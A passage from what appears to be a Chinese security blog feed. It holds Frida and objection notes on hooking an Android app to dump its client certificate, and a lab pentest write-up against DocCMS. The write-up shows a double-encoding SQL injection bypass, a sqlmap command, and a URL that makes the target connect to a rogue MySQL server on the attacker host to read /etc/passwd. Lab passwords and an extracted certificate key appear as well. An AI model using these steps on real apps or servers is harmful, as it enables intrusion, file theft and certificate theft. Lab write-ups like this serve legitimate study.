class="built_in">console</span>.log(<span class="string">&quot;save success!&quot;</span>)</span><br><span class="line">                out.close()</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.load(arg0, arg1);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;hook_KeyStore_load...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    hook_KeyStore_load()    </span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure><p>成功hook后，会将p12文件写入到sdcard中，adb pull出来就可以了，如果pull失败可以对p12改名，可能是文件名有多个后缀造成的</p><p>这里获取到密钥是：}%2R+\OSsjpP!w%X</p><p><img src="https://i.loli.net/2021/10/20/SWZEcYnIhD7XFpd.png" alt="Untitled"></p><p>进入Charles，打开SSL Proxying Settings，添加一个客户端证书，导入p12并按要求输入密码</p><p>之后再设置主机白名单</p><p><img src="https://i.loli.net/2021/10/20/ymnVWHKPJhSt2i1.png" alt="Untitled"></p><p>成功抓取soul数据包</p><p><img src="https://i.loli.net/2021/10/20/KiRnWfM7cLtVm6C.png" alt="Untitled"></p><p><img src="https://i.loli.net/2021/10/20/zHeOjyfxQgqVmXL.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;使用charles对soul进行抓包提示服务器拒绝连接，猜测是服务端通过p12证书对客户端进行校验 &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/10/20/tDvJ7XKrYCh1Hwu.png&quot; alt=&quot;Untitled&quot;&gt;&lt;/p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Frida笔记二： objection</title>
    <link href="https://tutucoo.github.io/2021/10/09/Frida%E7%AC%94%E8%AE%B0%E4%BA%8C%EF%BC%9Aobjection/"/>
    <id>https://tutucoo.github.io/2021/10/09/Frida%E7%AC%94%E8%AE%B0%E4%BA%8C%EF%BC%9Aobjection/</id>
    <published>2021-10-09T03:06:12.000Z</published>
    <updated>2021-10-09T03:09:23.987Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Frida笔记二：-objection"><a href="#Frida笔记二：-objection" class="headerlink" title="Frida笔记二： objection"></a>Frida笔记二： objection</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>objection是一个基于Frida开发的工具，可以很方便的hook Java函数和类，并且输出参数，调用栈，返回值。</p><h2 id="安装objection"><a href="#安装objection" class="headerlink" title="安装objection"></a><strong>安装objection</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install objection</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/09/OpWJPNnb49jEsfX.png" alt="Untitled"></p><h2 id="常用功能"><a href="#常用功能" class="headerlink" title="常用功能"></a>常用功能</h2><h3 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a><strong>帮助</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">help android hooking watch class_method</span><br></pre></td></tr></table></figure><h3 id="注入app"><a href="#注入app" class="headerlink" title="注入app"></a>注入app</h3><p>通过wifi的方式启动手机上的app</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -N -h 192.168.1.115 -p 8888 -g com.android.settings explore</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/09/vVK9r7XHgIyWNTc.png" alt="Untitled"></p><h3 id="android-heap"><a href="#android-heap" class="headerlink" title="android heap"></a>android heap</h3><p>execute：执行Java 类方法</p><p>search instances：搜索Android堆中的类实例</p><h3 id="android-root"><a href="#android-root" class="headerlink" title="android root"></a>android root</h3><p>尝试禁用root检测 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android root disable</span><br></pre></td></tr></table></figure><p>尝试模拟root环境 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android root simulate</span><br></pre></td></tr></table></figure><h3 id="android-intent"><a href="#android-intent" class="headerlink" title="android intent"></a>android intent</h3><p>启动activity</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android intent launch_activity</span><br></pre></td></tr></table></figure><p>启动服务 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android intent launch_service</span><br></pre></td></tr></table></figure><h3 id="android-hooking-search"><a href="#android-hooking-search" class="headerlink" title="android hooking search"></a>android hooking search</h3><p>搜索类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking search classes</span><br></pre></td></tr></table></figure><p>搜索方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking search methods</span><br></pre></td></tr></table></figure><h3 id="android-hooking-list"><a href="#android-hooking-list" class="headerlink" title="android hooking list"></a>android hooking list</h3><p>列出所有activity</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking <span class="keyword">list</span> activities</span><br></pre></td></tr></table></figure><p>列出所有类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking <span class="keyword">list</span> classes</span><br></pre></td></tr></table></figure><p>列出所有类方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking <span class="keyword">list</span> class_methods</span><br></pre></td></tr></table></figure><p>列出所有classloader</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking <span class="keyword">list</span> class_loaders</span><br></pre></td></tr></table></figure><p>列出所有监听器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking <span class="keyword">list</span> receivers</span><br></pre></td></tr></table></figure><p>列出所有服务 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking <span class="keyword">list</span> services</span><br></pre></td></tr></table></figure><h3 id="android-hooking-watch"><a href="#android-hooking-watch" class="headerlink" title="android hooking watch"></a>android hooking watch</h3><p>hook类调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class --dump-args --dump-b</span><br><span class="line">acktrace --dump-return</span><br></pre></td></tr></table></figure><p>hook方法调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method --dump-args -</span><br><span class="line">-dump-backtrace --dump-<span class="keyword">return</span></span><br></pre></td></tr></table></figure><h3 id="memory-dump"><a href="#memory-dump" class="headerlink" title="memory dump"></a>memory dump</h3><p>dump当前进程的整个内存</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory dump all</span><br></pre></td></tr></table></figure><p>指定基址进行dump</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory dump from_base</span><br></pre></td></tr></table></figure><h3 id="memory-search"><a href="#memory-search" class="headerlink" title="memory search"></a>memory search</h3><p>从指定偏移搜索内存</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory search --offsets-only</span><br></pre></td></tr></table></figure><p>在内存中搜索字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory search --<span class="keyword">string</span></span><br></pre></td></tr></table></figure><h3 id="memory-write"><a href="#memory-write" class="headerlink" title="memory write"></a>memory write</h3><p>写内存</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory write --<span class="keyword">string</span></span><br></pre></td></tr></table></figure><h3 id="memory-list"><a href="#memory-list" class="headerlink" title="memory list"></a>memory list</h3><p>导出模块信息到文件 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory <span class="keyword">list</span> exports</span><br></pre></td></tr></table></figure><p>列出模块信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory <span class="keyword">list</span> modules</span><br></pre></td></tr></table></figure><h3 id="job"><a href="#job" class="headerlink" title="job"></a>job</h3><p>显示当前任务，比如说android hooking watch一个类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jobs <span class="keyword">list</span></span><br></pre></td></tr></table></figure><p>删除一个任务</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jobs kill</span><br></pre></td></tr></table></figure><h3 id="objection-log"><a href="#objection-log" class="headerlink" title="objection log"></a>objection log</h3><p>显示objection历史操作信息 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .objection/objection.log </span><br></pre></td></tr></table></figure><h3 id="plugin"><a href="#plugin" class="headerlink" title="plugin"></a>plugin</h3><p>加载插件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugin load /root/Wallbreaker</span><br></pre></td></tr></table></figure><p>可以查看到插件的所有命令</p><p><img src="https://i.loli.net/2021/10/09/BPIpo4cROVWH91G.png" alt="Untitled"></p><h2 id="插件：Wallbreaker"><a href="#插件：Wallbreaker" class="headerlink" title="插件：Wallbreaker"></a>插件：Wallbreaker</h2><p>这个插件在最新的objection中使用bug比较多</p><p>classsearch：搜索类名中包含bluetooth的类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugin wallbreaker classsearch bluetooth</span><br></pre></td></tr></table></figure><p>classdump：dump类中所有信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plugin wallbreaker classdump --fullname com.andr</span><br><span class="line">oid.settingslib.bluetooth.BluetoothCallback</span><br></pre></td></tr></table></figure><p>objectsearch：搜索对象 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugin wallbreaker objectsearch</span><br></pre></td></tr></table></figure><p>objectdump：dump对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plugin wallbreaker objectdump --<span class="keyword">as</span>-<span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">plugin</span> <span class="title">wallbreaker</span> <span class="title">objectdump</span> --<span class="title">fullname</span></span></span><br></pre></td></tr></table></figure><h2 id="插件：FRIDA-DEXDump"><a href="#插件：FRIDA-DEXDump" class="headerlink" title="插件：FRIDA-DEXDump"></a>插件：FRIDA-DEXDump</h2><p>搜索所有dex</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugin dexdump search</span><br></pre></td></tr></table></figure><p>dump内存中所有的dex</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugin dexdump dump</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/09/Wx5M81h3X42uvbk.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Frida笔记二：-objection&quot;&gt;&lt;a href=&quot;#Frida笔记二：-objection&quot; class=&quot;headerlink&quot; title=&quot;Frida笔记二： objection&quot;&gt;&lt;/a&gt;Frida笔记二： objection&lt;/h1&gt;&lt;h2 i</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Frida笔记一：环境搭建</title>
    <link href="https://tutucoo.github.io/2021/10/08/Frida%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%9A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://tutucoo.github.io/2021/10/08/Frida%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%9A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2021-10-08T07:59:12.000Z</published>
    <updated>2021-10-08T08:03:25.309Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Frida笔记一：环境搭建"><a href="#Frida笔记一：环境搭建" class="headerlink" title="Frida笔记一：环境搭建"></a>Frida笔记一：环境搭建</h1><h2 id="安装python3"><a href="#安装python3" class="headerlink" title="安装python3"></a><strong>安装python3</strong></h2><p>frida需要python3的支持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyenv install 3.7.5 -v</span><br></pre></td></tr></table></figure><h2 id="安装frida"><a href="#安装frida" class="headerlink" title="安装frida"></a><strong>安装frida</strong></h2><p>安装frida(安装frida-tools会自动安装最新版frida，所以也要指定frida-tools的版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install frida&#x3D;&#x3D;12.4.8</span><br></pre></td></tr></table></figure><p>安装frida tool(命令行工具)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install frida-tools&#x3D;&#x3D;1.3.2</span><br></pre></td></tr></table></figure><p>查看frida版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida --version</span><br></pre></td></tr></table></figure><h2 id="运行frida-server"><a href="#运行frida-server" class="headerlink" title="运行frida server"></a>运行<strong>frida server</strong></h2><p>在此页面<a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a></p><p>下载frida-server-12.4.8-android-arm64.xz，frida-server的版本与前面安装的frida版本要一致</p><p>解压frida-server-12.4.8-android-arm64.xz释放出frida-server-12.4.8-android-arm64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ adb push frida-server-12.4.8-android-arm64 &#x2F;data&#x2F;local&#x2F;tmp&#x2F;fs1248</span><br><span class="line">$ adb shell chmod +x &#x2F;data&#x2F;local&#x2F;tmp&#x2F;fs1248</span><br></pre></td></tr></table></figure><p>需要注意的是，在启动frida server之前要确保手机selinux是关闭的状态，可以通过指令进行设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set enforce 0</span><br></pre></td></tr></table></figure><p>此外还要关闭Magisk的Magisk Hide功能</p><p>启动服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;data&#x2F;local&#x2F;tmp&#x2F;fs1248 -l 0.0.0.0:8888 </span><br></pre></td></tr></table></figure><h2 id="frida脚本开发环境"><a href="#frida脚本开发环境" class="headerlink" title="frida脚本开发环境"></a>frida脚本开发环境</h2><p>进行环境安装 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> git:<span class="comment">//github.com/oleavr/frida-agent-example.git</span></span><br><span class="line">cd frida-agent-example/</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>用vscode打开firda-agent-example文件，然后在agent下编写脚本就有提示了 </p><p><img src="https://i.loli.net/2021/10/08/N5TX2QLhjItrYsc.png" alt="Untitled"></p><p>进入frida-agent-example文件夹执行下面的命令会监控修改并自动生成js文件 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run watch</span><br></pre></td></tr></table></figure><p>执行脚本 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -f com.android.settings -H <span class="number">192.168</span><span class="number">.1</span><span class="number">.115</span>:<span class="number">8888</span> -l test.js --no-pause</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/08/3wSUdzC9VqsNKpA.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Frida笔记一：环境搭建&quot;&gt;&lt;a href=&quot;#Frida笔记一：环境搭建&quot; class=&quot;headerlink&quot; title=&quot;Frida笔记一：环境搭建&quot;&gt;&lt;/a&gt;Frida笔记一：环境搭建&lt;/h1&gt;&lt;h2 id=&quot;安装python3&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>记一次Linux内网渗透测试</title>
    <link href="https://tutucoo.github.io/2021/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>https://tutucoo.github.io/2021/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</id>
    <published>2021-10-03T12:10:03.000Z</published>
    <updated>2021-10-08T07:52:05.208Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h2><h3 id="攻击主机"><a href="#攻击主机" class="headerlink" title="攻击主机"></a>攻击主机</h3><p>192.168.0.128</p><h3 id="内网1号机"><a href="#内网1号机" class="headerlink" title="内网1号机"></a>内网1号机</h3><p>内网1号机:192.168.0.122/10.10.10.145  密码：yanisy123</p><p>内网1号设置静态ip</p><p>点击编辑连接 </p><p><img src="https://i.loli.net/2021/10/03/A5IwYGpQl34768U.png" alt="Untitled"></p><p>设置静态ip</p><p><img src="https://i.loli.net/2021/10/03/cSA17vs5Fb3IiWx.png" alt="Untitled"></p><p>两张网卡都设置好以后断开重连</p><p><img src="https://i.loli.net/2021/10/03/OJ4cWzASqEt8NUj.png" alt="Untitled"></p><p>内网1号机根目录下有bt.txt，里面有一个宝塔的后台网址以及用户名密码</p><p><img src="https://i.loli.net/2021/10/03/UgutS9EcbJ5NAMn.png" alt="Untitled"></p><p>直接访问8888端口会跳转到login</p><p><img src="https://i.loli.net/2021/10/03/akprXlV2zcPLD9x.png" alt="Untitled"></p><p>80端口直接访问会提示错误，需要在hosts文件中绑定到<a href="http://www.ddd4.com,这好像是宝塔的设定,宝塔后台建立了一个网站www.ddd4.com,无法通过ip直接访问,需要访问域名/">www.ddd4.com，这好像是宝塔的设定，宝塔后台建立了一个网站www.ddd4.com，无法通过ip直接访问，需要访问域名</a></p><p><img src="https://i.loli.net/2021/10/03/caoP9yBvWI3e8xA.png" alt="Untitled"></p><h3 id="内网2号机"><a href="#内网2号机" class="headerlink" title="内网2号机"></a>内网2号机</h3><p>内网2号机:10.10.10.144</p><h2 id="扫描内网主机"><a href="#扫描内网主机" class="headerlink" title="扫描内网主机"></a>扫描内网主机</h2><p>nmap发现内网主机，一共两台，分别是192.168.0.122和192.168.0.109，109是攻击机，122是内网1号机</p><p><img src="https://i.loli.net/2021/10/03/w2vZpGCAzDLfsR3.png" alt="Untitled"></p><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>探1号机端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -v <span class="number">192.168</span><span class="number">.0</span><span class="number">.122</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/03/JDqYguBx1RSmbNQ.png" alt="Untitled"></p><h2 id="扫目录"><a href="#扫目录" class="headerlink" title="扫目录"></a>扫目录</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://www.ddd4.com -w /usr/share/wordlists/dirbuster/directory-<span class="built_in">list</span>-<span class="number">2.3</span>-medium.txt -x <span class="string">&#x27;php,html&#x27;</span> -o <span class="built_in">dir</span>.log --wildcard</span><br></pre></td></tr></table></figure><p>用上面的指令进行扫描时会有很多响应是200，但是长度是一样的，这都是错误页，要将它们过滤掉</p><p><img src="https://i.loli.net/2021/10/03/KNvcbo9AS18IWJs.png" alt="Untitled"></p><p>过滤语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://www.ddd4.com -w /usr/share/wordlists/dirbuster/directory-<span class="built_in">list</span>-<span class="number">2.3</span>-medium.txt -x <span class="string">&#x27;php,html&#x27;</span> -o <span class="built_in">dir</span>.log --wildcard | grep -v <span class="string">&quot;Size: 11807&quot;</span>|grep -v <span class="string">&quot;Size:49&quot;</span></span><br></pre></td></tr></table></figure><h2 id="查看网站信息"><a href="#查看网站信息" class="headerlink" title="查看网站信息"></a>查看网站信息</h2><p>用whatweb查看网站信息 ，不同的域名返回的信息不一样</p><p><img src="https://i.loli.net/2021/10/03/wly4JUdzAWB1ksD.png" alt="Untitled"></p><h2 id="网站搭建"><a href="#网站搭建" class="headerlink" title="网站搭建"></a>网站搭建</h2><p>把ddd4.com的源码下载下来并创建网站进行测试</p><p><img src="https://i.loli.net/2021/10/03/yLBu5qpzl3xmtGf.png" alt="Untitled"></p><p>需要手动在hosts文件中绑定<a href="http://www.duo1.com或者用同步hosts/">www.duo1.com或者用同步hosts</a></p><p>然后访问<a href="http://www.duo1.com进行安装,之后就可以访问了/">www.duo1.com进行安装，之后就可以访问了</a></p><h2 id="代码审计-二次编码"><a href="#代码审计-二次编码" class="headerlink" title="代码审计-二次编码"></a>代码审计-二次编码</h2><p>目标是DocCMS，代码审计要多关注过滤规则，看有没有绕过的方法</p><p>看到很多urldecode函数，这里可能存在二次编码注入</p><p><img src="https://i.loli.net/2021/10/03/YZKvMArpwtRWV4h.png" alt="Untitled"></p><p>原文是11111’，对其进行两次url编码，执行后仍然会被解析成11111’</p><p><img src="https://i.loli.net/2021/10/03/YKQzbNkvaE12CTP.png" alt="Untitled"></p><p>有的时候一次编码会被过滤掉，但是二次编码就可以绕过防护</p><p>调用一些过滤函数，看过滤效果</p><p><img src="https://i.loli.net/2021/10/03/d9jMaPfk4uGl1g3.png" alt="Untitled"></p><p>可以看到对单引号进行了过滤</p><p><img src="https://i.loli.net/2021/10/03/UMXdqhkjzANH5I9.png" alt="Untitled"></p><p>如果对payload进行二次编码则可以绕过</p><p><img src="https://i.loli.net/2021/10/03/O4brdawqne9op6I.png" alt="Untitled"></p><p>找到一处地址存在sql注入，这里checkSqlStr可以用二次url编码绕过</p><p><img src="https://i.loli.net/2021/10/03/EGYBcfI54L1hQ2v.png" alt="Untitled"></p><p>这个函数位于content/search/index.php，所以构造如下，确实存在注入</p><p><img src="https://i.loli.net/2021/10/03/X4Hq3uwUYzBDVfS.png" alt="Untitled"></p><p>sqlmap跑一遍，成功跑出数据  </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u http://www.ddd4.com/search?keyword=11 --dbms mysql -v 1 --tamper chardoubleencode.py</span><br></pre></td></tr></table></figure><h2 id="代码审计-mysql任意文件读取漏洞"><a href="#代码审计-mysql任意文件读取漏洞" class="headerlink" title="代码审计-mysql任意文件读取漏洞"></a>代码审计-mysql任意文件读取漏洞</h2><p>setup/checkdb.php里面有一段代码，这段代码会导致mysql远程连接任意文件读取漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbhost</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;dbhost&#x27;</span>];</span><br><span class="line"><span class="variable">$uname</span>  = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$pwd</span>= <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="variable">$dbname</span>= <span class="variable">$_REQUEST</span>[<span class="string">&#x27;dbname&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]==<span class="string">&quot;chkdb&quot;</span>)&#123;</span><br><span class="line"><span class="variable">$con</span> = @mysql_connect(<span class="variable">$dbhost</span>,<span class="variable">$uname</span>,<span class="variable">$pwd</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$rs</span> = mysql_query(<span class="string">&#x27;show databases;&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_assoc(<span class="variable">$rs</span>))&#123;</span><br><span class="line"><span class="variable">$data</span>[] = <span class="variable">$row</span>[<span class="string">&#x27;Database&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$rs</span>, <span class="variable">$row</span>);</span><br><span class="line">mysql_close();</span><br><span class="line"><span class="keyword">if</span> (in_array(strtolower(<span class="variable">$dbname</span>), <span class="variable">$data</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]==<span class="string">&quot;creatdb&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$dbname</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$con</span> = @mysql_connect(<span class="variable">$dbhost</span>,<span class="variable">$uname</span>,<span class="variable">$pwd</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (mysql_query(<span class="string">&quot;CREATE DATABASE <span class="subst">&#123;$dbname&#125;</span> DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci&quot;</span>,<span class="variable">$con</span>))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> mysql_error();</span><br><span class="line">&#125;</span><br><span class="line">mysql_close(<span class="variable">$con</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过rogue-mysql-server读取/etc/passwd</p><p><img src="https://i.loli.net/2021/10/03/1tDJyipG5gIlzKd.png" alt="Untitled"></p><p>使用python2.x运行Rogue-MySql-Server服务，运行伪造mysql服务器，等待连接</p><p><img src="https://i.loli.net/2021/10/03/wlCr81MJxY4RZta.png" alt="Untitled"></p><p>访问url触发漏洞,192.168.0.128是攻击机，这里ip进行了更改，为了统一，之后三台主机会分别统称攻击机、内网1号机（1号机）、内网2号机（2号机）</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.ddd4.com/setup/checkdb.php?dbname=mysql&amp;uname=root&amp;pwd=123456&amp;dbhost=192.168.0.128&amp;action=chkdb</span><br></pre></td></tr></table></figure><p>访问url触发，漏洞触发还导致暴露了根目录</p><p><img src="https://i.loli.net/2021/10/03/VsPIgKqbNeXmGZL.png" alt="Untitled"></p><p>再看mysql.log文件，etc/passwd文件内容已经读取到了</p><p><img src="https://i.loli.net/2021/10/03/GgQjRSUpc64TZre.png" 